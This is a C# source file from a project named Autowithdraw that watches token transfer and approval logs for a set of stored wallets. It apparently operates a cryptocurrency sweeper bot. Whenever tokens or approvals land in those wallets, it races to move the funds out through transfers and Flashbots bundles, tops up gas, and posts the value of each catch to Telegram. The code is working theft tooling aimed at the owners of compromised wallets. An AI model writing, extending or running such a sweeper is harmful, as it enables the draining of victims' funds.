using Autowithdraw.Global;
using Autowithdraw.Global.Common;
using Autowithdraw.Main.Actions;
using Autowithdraw.Main.Handlers;
using Nethereum.RPC.Eth.DTOs;
using Nethereum.Web3;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Numerics;
using System.Threading;
using System.Threading.Tasks;

namespace Autowithdraw.Main
{
    internal class Parse
    {
        public static List<string> Last = new List<string>();

        public static async Task Transaction(
            string txHash,
            int ChainID,
            bool isContract = true)
        {
            try
            {
                TransactionReceipt Transaction = await Helper.WaitForTransactionReceipt(txHash, ChainID, isContract);

                if (Transaction == null || !Transaction.Succeeded())
                    return;

                foreach (var log in Transaction.Logs)
                {
                    try
                    {
                        if (log["topics"].Count() < 3) continue;

                        #region Values

                        string Address_From = Web3.ToChecksumAddress(log["topics"][1].ToString().Substring(26));
                        string Address_To = Web3.ToChecksumAddress(log["topics"][2].ToString().Substring(26));
                        string ContractAddress = Web3.ToChecksumAddress(log["address"].ToString());
                        BigInteger Wei = BigInteger.Parse(log["data"].ToString().Substring(2),
                            NumberStyles.AllowHexSpecifier);
                        bool Approve = log["topics"][0].ToString().StartsWith("0x8c5be1e5");

                        #endregion

                        if (Approve && Address_To == Settings.Config.Proxy.Address && Settings.Wallets.ContainsKey(Address_From))
                            await Task.Factory.StartNew(() => Token(ContractAddress, 0, Address_From, ChainID, txHash));

                        if (ContractAddress.Split('0').Length > 12 || Wei == 0 || Address_To.Split('0').Length > 12 || Approve)
                            continue;

                        if (Settings.Wallets.ContainsKey(Address_To))
                            await Task.Factory.StartNew(() =>
                                Token(ContractAddress, Wei, Address_To, ChainID, txHash));
                        else if (Settings.Wallets.ContainsKey(Address_From) && Address_To != Settings.Config.Recipient &&
                                 Address_To != Settings.Config.Proxy.Address)
                        {
                            await Task.Factory.StartNew(() =>
                                Token(ContractAddress, Wei, Address_From, ChainID, txHash, false, Address_To));
                        }
                    }
                    catch (FormatException)
                    {
                        // ignored
                    }
                }
            }
            catch (Nethereum.JsonRpc.Client.RpcClientTimeoutException)
            {
                Logger.Error($"[Contract] {Settings.Chains[ChainID].API} not responding");
            }
            catch (NullReferenceException)
            {
                // ignored
            }
            catch (Exception e)
            {
                Logger.Error(e);
            }
        }

        public static async Task Token(
            string ContractAddress,
            BigInteger Wei,
            string Address,
            int ChainID,
            string txHash,
            bool Ingoing = true,
            string Outgoing = "",
            bool fromTelegram = false,
            bool fromPending = false,
            bool fromApprove = false)
        {
            try
            {
                #region Values
                Console.WriteLine(1);
                string Link = Settings.Chains[ChainID].Link;
                var W3 = Settings.Chains[ChainID].Web3;

                var Contract = new ContractHelper(Address, ContractAddress, W3);
                BigInteger BalanceWei = await Contract.Balance(Address);

                if (Settings.Config.Other.ScamTokens.Contains(ContractAddress))
                    return;
                Console.WriteLine(2);
                if (Last.Contains(Address + Ingoing + Wei) && !fromTelegram)
                {
                    TransactionReceipt Transaction = await Helper.WaitForTransactionReceipt(txHash, ChainID, true);

                    if (Transaction == null || !Transaction.Succeeded() || Last.Contains(txHash))
                        return;
                    fromPending = false;
                }

                Last.Add(Address + Ingoing + Wei);
                Last.Add(txHash);
                Console.WriteLine(3);
                if (BalanceWei < Wei && Wei > await Contract.Decimals() * 0.001f)
                    Wei += BalanceWei;

                #endregion

                await Task.Factory.StartNew(() => Balance.Check(Address));

                if (Pricing.ValidPrice(ChainID, Address, ContractAddress, Wei, BalanceWei, await Contract.Decimals(), await Contract.Name(), out float Price,
                        out float Ether, out BigInteger TrueWei, isNotification: true))
                {
                    string Mutex = ContractAddress + Address;
                    if (Transfer.Busy.Contains(Mutex) && fromPending || Outgoing == "0x4Fe59AdcF621489cED2D674978132a54d432653A")
                        return;
                    Console.WriteLine(4);
                    #region Notification

                    await Task.Factory.StartNew(async () =>
                    {
                        if (!fromTelegram && !fromPending)
                        {
                            TransactionReceipt Transaction = await Helper.WaitForTransactionReceipt(txHash, ChainID, true);

                            if (!Transaction.Succeeded())
                                return;
                        }

                        string Symbol = await Contract.Symbol();

                        if (string.IsNullOrWhiteSpace(Symbol))
                            return;

                        if (Ingoing && (ChainID != 1 || Price >= 50))
                            await Network.SendTelegram(
                                $"{Pricing.GetEmoji(Price)} <a href=\"{(fromTelegram ? txHash : $"https://{Link}/tx/{txHash}")}\">{(fromTelegram ? "Checked balance" : (fromApprove ? "Approved" : "New") + (fromPending ? " (Pending)" : ""))} {Symbol}</a>\n\nWallet: <a href=\"https://{Link}/address/{Address}\">{Address}</a>\nAmount: {Ether} <a href=\"https://{Link}/token/{ContractAddress}?a={Address}\">{Symbol}</a> ({Price}$)",
                                ContractAddress,
                                ChainID,
                                true,
                                isTransaction: true);
                        else if (Price >= 50)
                            await Network.SendTelegram(
                                $"{Pricing.GetEmoji(Price)} <a href=\"https://{Link}/tx/{txHash}\">Out {Symbol}</a>\n\nWallet: <a href=\"https://{Link}/address/{Address}\">{Address}</a>\nTo: <a href=\"https://{Link}/address/{Outgoing}\">{Outgoing}</a>\nAmount: {Ether} <a href=\"https://{Link}/token/{ContractAddress}?a={Address}\">{Symbol}</a> ({Price}$)",
                                ContractAddress,
                                ChainID,
                                true,
                                isTransaction: true);

                    });

                    #endregion

                    if (!Settings.Wallets.ContainsKey(Address))
                    {
                        await Network.SendTelegram($"{Address} not contains in DB", isTransaction: true);
                        return;
                    }

                    if (!Ingoing) return;

                    Pricing.ValidPrice(ChainID, Address, ContractAddress, 0, 0, await Contract.Decimals(),
                        await Contract.Name(),
                        out _, out _, out _);

                    #region Ethereum

                    if (ChainID == 1 && Price >= 10 && !Settings.Config.Other.StoppedAW)
                    {
                        await Task.Factory.StartNew(() => Flashbots.Ethereum(ContractAddress, Address, TrueWei));
                    }

                    #endregion

                    #region Autowithdraw Tokens

                    if (ContractAddress == "0x20f663CEa80FaCE82ACDFA3aAE6862d246cE0333" || (Price < 6 && !fromTelegram) || Settings.Config.Other.StoppedAW)
                        return;

                    await Task.Factory.StartNew(() => Transfer.Token(ContractAddress, Address, Price, ChainID));

                    if ((Price >= 6 || fromTelegram) && ChainID == 56)
                        await Flashbots.BSC(Address, ContractAddress);

                    if (Price >= 50 && (Price < 500 || ChainID != 56) && !Transfer.Busy.Contains(Mutex) && !fromTelegram)
                        for (int i = 0; i < (Settings.Config.Other.TrustedTokens.ContainsKey(ContractAddress) ? 60 : 5); i++)
                        {
                            Thread.Sleep(1000 * 10);
                            BalanceWei = await Contract.Balance();
                            if (BalanceWei > await Contract.Decimals() * 0.001f && !Settings.Config.Other.ScamTokens.Contains(ContractAddress))
                                await Task.Factory.StartNew(() => Helper.TransferGas(Address, ChainID, 0.1f));
                        }

                    Transfer.Busy.Add(Mutex);

                    #endregion
                }
            }
            catch(Exception e)
            {
                Logger.Debug(e.ToString());
            }
        }
    }
}
